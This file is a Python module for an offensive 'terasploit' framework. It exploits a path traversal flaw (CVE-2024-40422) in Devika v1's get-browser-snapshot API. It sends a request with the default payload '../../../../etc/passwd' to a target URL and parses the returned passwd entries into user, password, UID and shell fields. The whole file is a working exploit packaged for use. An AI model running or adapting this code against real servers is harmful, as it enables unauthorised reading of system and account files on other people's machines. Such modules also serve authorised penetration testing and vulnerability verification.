#######
# Module/Auxiliary: Devika v1 Path Traversal VIA snapshot_path Parameter

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.auxiliary import *

class TerasploitModule(Auxiliary):
    
    module_type = 'auxiliary'
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : self.module_type,
                'Name' : 'Devika v1 Path Traversal VIA snapshot_path Parameter',
                
                'Module Author' : 'Charlie (4steroth)',
                'Exploit Author' : 'Alperen Ergel',
                'Credits' : 'j3r1ch0123',
                
                'Version' : 'v1',
                'CVE' : 'CVE-2024-40422',
                
                'NVD' : 'https://nvd.nist.gov/vuln/detail/CVE-2024-40422',
                'Exploit-DB' : 'https://www.exploit-db.com/exploits/52066',
                
                'Description' : [
                    'manipulate the snapshot_path parameter to traverse directories and access ',
                    'sensitive files on the server.'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('auxiliary',opt=[
            OptString.new('target','url',['','yes','the url of the target']),
            OptString.new('snapshot_path','none',['../../../../etc/passwd','yes','snapshot path to access'])
        ])
        
    
    def run(self):
        target = self.GetOPT('target')
        snapshot_path = self.GetOPT('snapshot_path')
        
        hostname, scheme = self.ParseTarget(target, return_list=['hostname','scheme'])
        target_url = f'{scheme}://{hostname}/api/get-browser-snapshot'
        
        param_content = {
            'snapshot_path' : snapshot_path    
        }
        
        info_print(f'Target: {target_url}')
        try:
            response = HTTPClient.Request('get',url=target_url,params=param_content)
            print ('----')
            print (response.text)
            print ('----')
            
            passwd_pattern = re.compile(r"^([a-zA-Z0-9._-]+):([^:]*):(\d+):(\d+):([^:]*):([^:]*):([^:]*)$")
            contents = passwd_pattern.findall(response.text)
            for match in contents:
                user, password, uid, gid, comment, home, shell = match
                print("User: " + user)
                print("Password: " + password)
                print("UID: " + uid)
                print("GID: " + gid)
                print("Comment: " + comment)
                print("Home Directory: " + home)
                print("Shell: " + shell)
                print("----")
            return 'done', True
            
        except Exception as error:
            info_print (error,type='red')
            return 'exception', True